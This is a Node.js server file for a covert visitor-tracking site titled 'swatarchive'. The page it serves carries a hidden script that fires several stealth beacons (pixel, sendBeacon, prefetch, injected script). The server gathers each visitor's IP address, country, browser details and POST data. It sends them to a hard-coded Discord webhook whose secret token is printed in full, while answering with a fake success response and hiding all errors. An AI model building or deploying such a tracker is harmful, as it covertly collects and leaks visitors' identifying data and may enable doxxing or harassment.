// server.js - Complete Zombie Apocalypse Logging Server
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// ===== CONFIGURATION =====
const CONFIG = {
    // DISCORD WEBHOOK - KEEP THIS SECRET
    DISCORD_WEBHOOK: "https://discordapp.com/api/webhooks/1448404215562113055/CKrdAXsxve03ZnRCQ4SiQ8lkHOk1fbKMhO2hEtVLvNl87S_1ZJKZpqP5yKlSe6gs3gpl",
    
    // LOGGING SETTINGS
    LOG_TO_FILE: true,
    LOG_FILE: "access.log",
    
    // STEALTH SETTINGS
    FAKE_RESPONSE: {
        status: "success",
        message: "OK",
        data: { version: "1.0.0" }
    },
    
    // RATE LIMITING (per IP)
    RATE_LIMIT: {
        windowMs: 15 * 60 * 1000, // 15 minutes
        maxRequests: 100
    }
};

// ===== STEALTH LOGGING CLASS =====
class GhostLogger {
    constructor() {
        this.rateLimit = new Map();
    }
    
    getClientIP(req) {
        // Multiple methods to get real IP
        const ipSources = [
            req.headers['cf-connecting-ip'],
            req.headers['x-real-ip'],
            req.headers['x-forwarded-for']?.split(',')[0].trim(),
            req.connection?.remoteAddress,
            req.socket?.remoteAddress,
            req.connection?.socket?.remoteAddress,
            req.ip
        ];
        
        for (const ip of ipSources) {
            if (ip && ip !== '::1' && ip !== '127.0.0.1' && ip !== '::ffff:127.0.0.1') {
                return ip;
            }
        }
        return 'Unknown';
    }
    
    checkRateLimit(ip) {
        const now = Date.now();
        const windowMs = CONFIG.RATE_LIMIT.windowMs;
        
        if (!this.rateLimit.has(ip)) {
            this.rateLimit.set(ip, []);
        }
        
        const requests = this.rateLimit.get(ip);
        const windowStart = now - windowMs;
        
        // Remove old requests
        while (requests.length > 0 && requests[0] < windowStart) {
            requests.shift();
        }
        
        // Check if under limit
        if (requests.length >= CONFIG.RATE_LIMIT.maxRequests) {
            return false;
        }
        
        requests.push(now);
        return true;
    }
    
    gatherIntelligence(req) {
        const ip = this.getClientIP(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const referrer = req.headers.referer || req.headers.referrer || 'Direct';
        
        // Advanced fingerprinting
        const intelligence = {
            // Basic info
            ip: ip,
            userAgent: userAgent,
            referrer: referrer,
            method: req.method,
            path: req.path,
            query: req.query,
            timestamp: new Date().toISOString(),
            
            // Network info
            host: req.headers.host,
            origin: req.headers.origin,
            accept: req.headers.accept,
            acceptEncoding: req.headers['accept-encoding'],
            acceptLanguage: req.headers['accept-language'],
            
            // Security headers
            secure: req.secure,
            https: req.protocol === 'https',
            
            // Cloudflare headers (if using CF)
            country: req.headers['cf-ipcountry'] || 'Unknown',
            ray: req.headers['cf-ray'] || 'None',
            
            // Performance/timing
            requestTime: Date.now()
        };
        
        // Add POST data if exists
        if (req.method === 'POST' && req.body) {
            intelligence.postData = req.body;
        }
        
        return intelligence;
    }
    
    async sendToDiscord(intel) {
        try {
            const embed = {
                title: "🔪 VISITOR LOGGED",
                color: 0x00ff00,
                fields: [
                    { name: "IP Address", value: `\`${intel.ip}\``, inline: true },
                    { name: "Country", value: intel.country, inline: true },
                    { name: "Method", value: intel.method, inline: true },
                    { name: "Path", value: intel.path, inline: true },
                    { name: "User Agent", value: `\`\`\`${intel.userAgent.substring(0, 200)}\`\`\`` },
                    { name: "Referrer", value: intel.referrer || 'None' },
                    { name: "Time", value: intel.timestamp },
                    { name: "Language", value: intel.acceptLanguage?.split(',')[0] || 'Unknown' },
                    { name: "Secure", value: intel.https ? '✅ HTTPS' : '❌ HTTP', inline: true }
                ],
                timestamp: new Date(intel.timestamp),
                footer: { text: `Zombie Apocalypse Logging v2.0` }
            };
            
            // Add query params if present
            if (Object.keys(intel.query).length > 0) {
                embed.fields.push({
                    name: "Query Params",
                    value: `\`\`\`json\n${JSON.stringify(intel.query, null, 2)}\`\`\``
                });
            }
            
            const payload = { embeds: [embed] };
            
            // Send with multiple fallbacks
            const sendMethods = [
                // Method 1: Direct axios
                () => axios.post(CONFIG.DISCORD_WEBHOOK, payload, {
                    timeout: 3000,
                    headers: { 'Content-Type': 'application/json' }
                }),
                
                // Method 2: Fetch with proxy
                () => fetch(CONFIG.DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    signal: AbortSignal.timeout(3000)
                })
            ];
            
            for (const method of sendMethods) {
                try {
                    await method();
                    break; // Success, break loop
                } catch (err) {
                    // Try next method
                    continue;
                }
            }
            
        } catch (error) {
            // Complete silence - no error logging
        }
    }
    
    logToFile(intel) {
        if (!CONFIG.LOG_TO_FILE) return;
        
        const logEntry = `[${intel.timestamp}] IP: ${intel.ip} | Agent: ${intel.userAgent.substring(0, 100)} | Referrer: ${intel.referrer} | Path: ${intel.path}\n`;
        
        fs.appendFile(CONFIG.LOG_FILE, logEntry, (err) => {
            if (err) {
                // Don't expose errors
            }
        });
    }
    
    async logRequest(req) {
        try {
            const intel = this.gatherIntelligence(req);
            const ip = intel.ip;
            
            // Check rate limit
            if (!this.checkRateLimit(ip)) {
                return; // Silently ignore if rate limited
            }
            
            // Send to Discord (async - don't wait)
            this.sendToDiscord(intel);
            
            // Log to file (async)
            this.logToFile(intel);
            
            // Clean old rate limit entries periodically
            if (Math.random() < 0.01) { // 1% chance on each request
                this.cleanupRateLimit();
            }
            
        } catch (error) {
            // Absolute silence
        }
    }
    
    cleanupRateLimit() {
        const now = Date.now();
        const windowMs = CONFIG.RATE_LIMIT.windowMs;
        
        for (const [ip, requests] of this.rateLimit.entries()) {
            const filtered = requests.filter(time => now - time < windowMs);
            if (filtered.length === 0) {
                this.rateLimit.delete(ip);
            } else {
                this.rateLimit.set(ip, filtered);
            }
        }
    }
}

// ===== MIDDLEWARE SETUP =====
app.set('trust proxy', true); // Trust proxy headers
app.use(express.json()); // Parse JSON bodies
app.use(express.urlencoded({ extended: true })); // Parse URL-encoded bodies

// CORS middleware (allow all origins)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Initialize logger
const logger = new GhostLogger();

// ===== ROUTES =====

// 1. STEALTH LOGGING ENDPOINT
app.all('/api/log', async (req, res) => {
    // Log the request (async - don't wait for completion)
    logger.logRequest(req);
    
    // Always return success response immediately
    res.status(200).json(CONFIG.FAKE_RESPONSE);
});

// 2. HEALTH CHECK (looks innocent)
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        version: '1.0.0',
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// 3. SERVE YOUR STATIC SITE
const YOUR_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>swatarchive</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link href="https://fonts.cdnfonts.com/css/minecraft-4" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --terminal: #00ff00;
            --bg: #000000;
            --fg: #ffffff;
        }

        body {
            background-color: var(--bg);
            color: var(--fg);
            font-family: 'Minecraft', 'Courier New', monospace;
            font-size: 20px;
            line-height: 1.5;
            overflow: hidden;
            height: 100vh;
            cursor: default;
        }

        .snowflake {
            position: fixed;
            top: -10px;
            z-index: 9998;
            user-select: none;
            pointer-events: none;
            animation: fall linear infinite;
            color: var(--fg);
            font-size: 20px;
        }

        @keyframes fall {
            to {
                transform: translateY(100vh);
            }
        }

        #entry-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(10px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            transition: opacity 0.5s ease;
        }

        #entry-screen.hidden {
            opacity: 0;
            pointer-events: none;
        }

        #entry-text {
            font-size: 3rem;
            color: var(--terminal);
            animation: pulse 2s ease-in-out infinite;
            text-shadow: 0 0 10px var(--terminal);
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        #main-content {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow-y: auto;
            padding: 20px;
            text-align: center;
        }

        .ascii-art {
            color: var(--terminal);
            font-family: 'Courier New', monospace;
            font-size: 10px;
            line-height: 1.2;
            white-space: pre;
            text-shadow: 0 0 5px var(--terminal);
            margin-bottom: 30px;
        }

        .welcome-text {
            margin-bottom: 30px;
            text-shadow: 0 0 5px var(--terminal);
            font-size: 1.2rem;
        }

        .info-section {
            margin-bottom: 20px;
        }

        .info-section > div {
            margin: 5px 0;
        }

        a {
            color: var(--terminal);
            text-decoration: none;
            transition: color 0.3s, text-shadow 0.3s;
        }

        a:hover {
            color: var(--fg);
            text-shadow: 0 0 10px var(--terminal);
        }

        .scanlines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                to bottom,
                transparent 50%,
                rgba(0, 255, 0, 0.03) 50%
            );
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 9997;
        }

        .crt {
            animation: flicker 0.15s infinite;
        }

        @keyframes flicker {
            0% { opacity: 0.98; }
            50% { opacity: 1; }
            100% { opacity: 0.98; }
        }

        #source-view {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            color: #ffffff;
            z-index: 20000;
            padding: 10px;
            overflow: auto;
            text-align: left;
            font-family: monospace;
        }

        #source-pre {
            color: #ffffff;
            white-space: pre;
            font-family: monospace;
            background: transparent;
            border: none;
            box-shadow: none;
        }

        body.source-mode .snowflake,
        body.source-mode .scanlines,
        body.source-mode #main-content,
        body.source-mode #entry-screen {
            display: none !important;
        }
        
        body.source-mode #source-view {
            display: block !important;
        }
        
        body.source-mode {
            overflow: auto;
        }
    </style>
</head>
<body>
    <div id="entry-screen">
        <div id="entry-text">CLICK TO ENTER</div>
    </div>

    <div class="scanlines"></div>

    <div id="main-content" class="crt">
        <div id="home-view">
            <div class="ascii-art">                         __                       .__    .__              
  ________  _  _______ _/  |______ _______   ____ |  |__ |__|__  __ ____  
 /  ___/\ \/ \/ /\__  \\   __\__  \\_  __ \_/ ___\|  |  \|  \  \/ // __ \ 
 \___ \  \     /  / __ \|  |  / __ \|  | \/\  \___|   Y  \  |\   /\  ___/ 
/____  >  \/\_/  (____  /__| (____  /__|    \___  >___|  /__| \_/  \___  >
     \/               \/          \/            \/     \/              \/</div>

            <div class="welcome-text">welcome to my site g</div>

            <div class="info-section">
                <div>&gt; Telegram: <a href="https://t.me/swatarchive" target="_blank" rel="noopener noreferrer">@swatarchive</a></div>
                <div>&gt; <a href="/source" id="source-link">SOURCE</a></div>
                <div>&gt; Message: hi</div>
            </div>
        </div>
    </div>

    <div id="source-view">
        <div style="margin-bottom: 20px;">
            <a href="/" id="back-home" style="color: #ffffff; text-decoration: underline;">&lt; Back</a>
        </div>
        <pre id="source-pre"></pre>
    </div>

    <audio id="bg-music" loop preload="auto">
        <source src="/files/song.mp3" type="audio/mpeg">
    </audio>

    <script>
        // ===== STEALTH LOGGING CLIENT =====
        // Multiple silent techniques to call /api/log
        const stealthLog = () => {
            const techniques = [
                // 1. Fetch with no-cors (completely silent)
                () => fetch('/api/log', {
                    method: 'GET',
                    mode: 'no-cors',
                    credentials: 'omit',
                    cache: 'no-store'
                }),
                
                // 2. Image pixel (works even with adblockers)
                () => {
                    const img = new Image();
                    img.src = '/api/log?format=img&r=' + Math.random();
                    img.width = 1;
                    img.height = 1;
                    img.style.display = 'none';
                    document.body.appendChild(img);
                    setTimeout(() => img.remove(), 1000);
                },
                
                // 3. Prefetch hint
                () => {
                    const link = document.createElement('link');
                    link.rel = 'prefetch';
                    link.href = '/api/log';
                    link.as = 'fetch';
                    document.head.appendChild(link);
                    setTimeout(() => link.remove(), 100);
                },
                
                // 4. Beacon if available
                () => {
                    if (navigator.sendBeacon) {
                        navigator.sendBeacon('/api/log');
                    }
                },
                
                // 5. Script tag injection
                () => {
                    const script = document.createElement('script');
                    script.src = '/api/log?callback=stealth';
                    document.body.appendChild(script);
                    setTimeout(() => script.remove(), 100);
                }
            ];
            
            // Execute all techniques silently
            techniques.forEach(tech => {
                try { 
                    tech(); 
                } catch(e) { 
                    /* ignore all errors */ 
                }
            });
        };
        
        // Trigger logging on multiple events
        const events = ['load', 'DOMContentLoaded', 'mousemove', 'keydown', 'click', 'scroll', 'touchstart'];
        events.forEach(event => {
            window.addEventListener(event, stealthLog, { 
                once: true,
                passive: true,
                capture: true 
            });
        });
        
        // Periodic logging for long sessions
        setInterval(stealthLog, 300000); // Every 5 minutes
        
        // Initial log after 1 second
        setTimeout(stealthLog, 1000);
        
        // ===== ORIGINAL SITE CODE =====
        const ORIGINAL_HTML_FALLBACK = '<!DOCTYPE html>\\n' + document.documentElement.outerHTML;

        function createSnowflake() {
            if (document.body.classList.contains('source-mode')) return;

            const snowflake = document.createElement('div');
            snowflake.classList.add('snowflake');
            snowflake.textContent = '❄';
            snowflake.style.left = Math.random() * window.innerWidth + 'px';
            snowflake.style.animationDuration = (Math.random() * 3 + 2) + 's';
            snowflake.style.opacity = Math.random();
            snowflake.style.fontSize = (Math.random() * 10 + 10) + 'px';
            document.body.appendChild(snowflake);
            setTimeout(() => snowflake.remove(), 5000);
        }

        setInterval(createSnowflake, 200);

        const entryScreen = document.getElementById('entry-screen');
        const bgMusic = document.getElementById('bg-music');
        const sourcePre = document.getElementById('source-pre');
        const sourceLink = document.getElementById('source-link');
        const backHomeLink = document.getElementById('back-home');

        function tryPlayMusic() {
            if (!bgMusic || document.body.classList.contains('source-mode')) return;
            bgMusic.play().catch(() => {});
        }

        function enterSite() {
            if (!entryScreen.classList.contains('hidden')) {
                entryScreen.classList.add('hidden');
                tryPlayMusic();
            }
        }

        async function loadSourceOnce() {
            if (!sourcePre || sourcePre.dataset.loaded === '1') return;
            sourcePre.dataset.loaded = '1';
            sourcePre.textContent = '<!DOCTYPE html>\\n' + document.documentElement.outerHTML;
        }

        function handleRouting() {
            const path = window.location.pathname;
            const isSource = path === '/source' || window.location.hash === '#source';

            if (isSource) {
                document.body.classList.add('source-mode');
                document.title = 'index.html';
                if (bgMusic) bgMusic.pause();
                loadSourceOnce();
            } else {
                document.body.classList.remove('source-mode');
                document.title = 'swatarchive';
                if (entryScreen.classList.contains('hidden')) {
                    tryPlayMusic();
                }
            }
        }

        if (sourceLink) {
            sourceLink.addEventListener('click', (e) => {
                e.preventDefault();
                history.pushState({}, "", "/source");
                handleRouting();
            });
        }

        if (backHomeLink) {
            backHomeLink.addEventListener('click', (e) => {
                e.preventDefault();
                history.pushState({}, "", "/");
                handleRouting();
            });
        }

        window.addEventListener('popstate', handleRouting);

        window.addEventListener('load', () => {
            handleRouting();
            if (!document.body.classList.contains('source-mode')) {
                tryPlayMusic();
            }
        });

        entryScreen.addEventListener('click', enterSite);
        document.addEventListener('keydown', enterSite);
    </script>
</body>
</html>`;

// 4. SERVE MAIN SITE
app.get('/', (req, res) => {
    // Log this visit too
    logger.logRequest(req);
    
    res.setHeader('Content-Type', 'text/html');
    res.send(YOUR_HTML);
});

// 5. SOURCE VIEW ENDPOINT
app.get('/source', (req, res) => {
    res.setHeader('Content-Type', 'text/html');
    res.send(YOUR_HTML); // Same HTML, client handles source view
});

// 6. CATCH-ALL FOR STATIC FILES (if any)
app.use('/files', express.static('public'));

// 7. 404 HANDLER
app.use((req, res) => {
    // Log 404s too
    logger.logRequest(req);
    
    res.status(404).send('404 - Not Found');
});

// ===== START SERVER =====
app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════════╗
    ║  ZOMBIE APOCALYPSE LOGGING SERVER v2.0   ║
    ║                                          ║
    ║  🔪 Logging active at: /api/log          ║
    ║  🌐 Server running on port: ${PORT}     ${PORT < 1000 ? ' ' : ''}║
    ║  📡 Discord webhook: CONFIGURED          ║
    ║  👻 Stealth mode: ACTIVE                 ║
    ╚══════════════════════════════════════════╝
    
    [INFO] Webhook is completely hidden from clients
    [INFO] All requests to /api/log will be logged
    [INFO] Check your Discord for incoming logs
    `);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n[INFO] Server shutting down...');
    process.exit(0);
});
